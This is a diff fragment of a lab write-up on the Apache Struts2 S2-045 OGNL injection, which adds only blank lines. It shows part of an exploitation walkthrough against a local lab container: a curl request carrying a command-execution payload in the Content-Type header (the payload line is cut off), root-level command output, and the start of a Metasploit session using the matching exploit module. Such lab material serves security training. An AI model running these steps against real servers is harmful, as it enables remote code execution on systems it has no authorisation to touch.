@@ -47,6 +47,7 @@ The vulnerability resides within the **Jakarta Multipart parser** used by Struts
 ## Exploitation Walkthrough
 
 ### 1. Verification of Vulnerability via Python / Curl
+
 Send a single HTTP request containing an OGNL command execution payload inside the `Content-Type` header:
 
 ```bash
@@ -56,12 +57,14 @@ curl -i -s -k -X POST 'http://localhost:8121/orders/3' \
 ```
 
 The response output immediately returns:
+
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 Linux cyberlab_04_struts2_s2045 ...
 ```
 
 ### 2. Automated Metasploit Exploitation
+
 ```bash
 msfconsole -q
 use exploit/multi/http/struts2_content_type_ognl
